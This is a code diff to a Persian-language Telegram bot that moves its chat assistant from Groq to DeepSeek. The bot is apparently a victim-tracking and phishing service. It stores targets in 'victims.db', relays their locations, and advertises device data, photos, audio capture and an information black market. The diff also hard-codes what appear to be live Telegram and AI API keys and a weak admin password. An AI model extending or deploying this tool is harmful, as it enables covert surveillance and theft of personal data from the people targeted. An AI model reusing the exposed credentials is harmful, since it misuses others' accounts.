@@ -11,7 +11,8 @@ TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8910769488:AAG7effUIZqoK0vVLJ_zRAV
 ADMIN_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "@Oython")
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8391932958"))
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
-GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
+DEEPSEEK_API_KEY = os.environ.get("DEEPSEEK_API_KEY", "sk-d1b5802a0d50444eb5371d769047b029")
+GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "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")
 DATABASE = "victims.db"
 PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
 
@@ -101,21 +102,23 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI (Context-aware) --------------------
-def ask_groq(prompt, user_id=None):
-    if not GROQ_API_KEY:
-        return "⚠️ کلید Groq تنظیم نشده است."
+# -------------------- DeepSeek AI (Chat) --------------------
+def ask_deepseek(prompt, user_id=None):
+    if not DEEPSEEK_API_KEY:
+        return "⚠️ کلید DeepSeek تنظیم نشده است."
     try:
-        url = "https://api.groq.com/openai/v1/chat/completions"
-        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
+        url = "https://api.deepseek.com/chat/completions"
+        headers = {
+            "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
+            "Content-Type": "application/json"
+        }
 
         system_prompt = (
-            "تو یک دستیار هوشمند، مستقیم و دقیق هستی. "
-            "به سوال کاربر مستقیماً پاسخ بده، بدون اینکه بپرسی 'درباره چه موضوعی صحبت کنیم' یا 'چه سوالی داری'. "
-            "همیشه پاسخ کامل، مفید و روان به زبان فارسی ارائه کن. "
+            "تو یک دستیار هوشمند، دقیق و حرفه‌ای هستی. "
+            "به سوال کاربر مستقیماً و با دقت پاسخ بده. "
+            "پاسخ‌های کامل، مفید و روان به زبان فارسی ارائه کن. "
             "اگر سوال فنی یا برنامه‌نویسی است، کد کامل و توضیح دقیق بده. "
-            "مودب، دوستانه و حرفه‌ای باش. "
-            "مکالمه را طبیعی ادامه بده، مثل یک دوست آگاه."
+            "همیشه مودب و دوستانه باش، مثل یک دوست آگاه."
         )
 
         messages = [{"role": "system", "content": system_prompt}]
@@ -123,41 +126,30 @@ def ask_groq(prompt, user_id=None):
             messages.extend(conversation_history[user_id][-20:])
         messages.append({"role": "user", "content": prompt})
 
-        models = [
-            "llama-3.3-70b-versatile",
-            "deepseek-r1-distill-llama-70b",
-            "llama-3.1-8b-instant"
-        ]
-        last_error = None
-        for model in models:
-            payload = {
-                "model": model,
-                "messages": messages,
-                "temperature": 0.8,
-                "max_tokens": 2048
-            }
-            resp = requests.post(url, json=payload, headers=headers, timeout=30)
-            if resp.status_code == 200:
-                data = resp.json()
-                answer = data['choices'][0]['message']['content'].strip()
-                if user_id is not None:
-                    if user_id not in conversation_history:
-                        conversation_history[user_id] = []
-                    conversation_history[user_id].append({"role": "user", "content": prompt})
-                    conversation_history[user_id].append({"role": "assistant", "content": answer})
-                if "چه موضوعی" in answer or "چه سوالی" in answer or "در مورد چه" in answer:
-                    continue
-                return answer
-            else:
-                last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
-                app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
-        if last_error:
-            return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
-        return answer
+        payload = {
+            "model": "deepseek-chat",
+            "messages": messages,
+            "temperature": 0.8,
+            "max_tokens": 2048
+        }
+        resp = requests.post(url, json=payload, headers=headers, timeout=30)
+        if resp.status_code == 200:
+            data = resp.json()
+            answer = data['choices'][0]['message']['content'].strip()
+            if user_id is not None:
+                if user_id not in conversation_history:
+                    conversation_history[user_id] = []
+                conversation_history[user_id].append({"role": "user", "content": prompt})
+                conversation_history[user_id].append({"role": "assistant", "content": answer})
+            return answer
+        else:
+            app.logger.error(f"DeepSeek error {resp.status_code}: {resp.text}")
+            return f"❌ خطای {resp.status_code} از هوش مصنوعی. لطفاً دقایقی دیگر تلاش کنید."
     except Exception as e:
-        app.logger.error(f"Groq exception: {e}")
+        app.logger.error(f"DeepSeek exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
 
+# -------------------- Groq Whisper (Transcription) --------------------
 def transcribe_audio(file_bytes):
     if not GROQ_API_KEY:
         return None
@@ -180,6 +172,7 @@ def transcribe_audio(file_bytes):
         app.logger.error(f"Transcription error: {e}")
         return None
 
+# -------------------- TTS --------------------
 async def text_to_speech_async(text, voice="fa-IR-FaridNeural"):
     try:
         communicate = edge_tts.Communicate(text=text, voice=voice)
@@ -704,7 +697,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس صدا و... دریافت کنید.\n\n"
         "دسترسی به انواع حساب ها ، مود تمام گیم ها و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه\n"
         "🛒 بازار سیاه اطلاعات برای خرید و فروش\n"
-        "🤖 هوش مصنوعی حرفه‌ای: پاسخگویی به پیام‌های خصوصی و ویس."
+        "🤖 هوش مصنوعی حرفه‌ای (DeepSeek): پاسخگویی به پیام‌های خصوصی و ویس."
     )
     keyboard = [
         [InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
@@ -913,9 +906,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
-        if AI_ENABLED and GROQ_API_KEY:
+        if AI_ENABLED and DEEPSEEK_API_KEY:
             thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
-            answer = ask_groq(msg.text, user_id=user_id)
+            answer = ask_deepseek(msg.text, user_id=user_id)
             if len(answer) > 4000:
                 parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
                 await thinking_msg.delete()
@@ -935,9 +928,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
     conn.close()
 
-    if msg.chat.type == 'private' and AI_ENABLED and GROQ_API_KEY:
+    if msg.chat.type == 'private' and AI_ENABLED and DEEPSEEK_API_KEY:
         thinking_msg = await msg.reply_text("🤔 در حال فکر کردن...")
-        answer = ask_groq(msg.text, user_id=user_id)
+        answer = ask_deepseek(msg.text, user_id=user_id)
         if len(answer) > 4000:
             parts = [answer[i:i+4000] for i in range(0, len(answer), 4000)]
             await thinking_msg.delete()
@@ -947,7 +940,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await thinking_msg.edit_text(answer)
 
 async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not AI_ENABLED or not GROQ_API_KEY:
+    if not AI_ENABLED or not DEEPSEEK_API_KEY:
         return
     msg = update.message
     user_id = msg.from_user.id
@@ -962,7 +955,7 @@ async def handle_voice(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("❌ نتونستم صدات رو تشخیص بدم.")
         return
     thinking_msg = await msg.reply_text("🤔 ...")
-    answer = ask_groq(transcript, user_id=user_id)
+    answer = ask_deepseek(transcript, user_id=user_id)
     audio_data = await text_to_speech_async(answer)
     if audio_data:
         await msg.reply_voice(voice=io.BytesIO(audio_data))
@@ -1167,7 +1160,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         elif data == "toggle_ai":
             if user_id != ADMIN_USER_ID: return
-            if not GROQ_API_KEY: await query.answer("کلید Groq تنظیم نشده", show_alert=True); return
+            if not DEEPSEEK_API_KEY: await query.answer("کلید DeepSeek تنظیم نشده", show_alert=True); return
             AI_ENABLED = not AI_ENABLED
             await query.edit_message_text(f"AI {'✅ روشن' if AI_ENABLED else '❌ خاموش'} شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="admin_panel")]]))
 
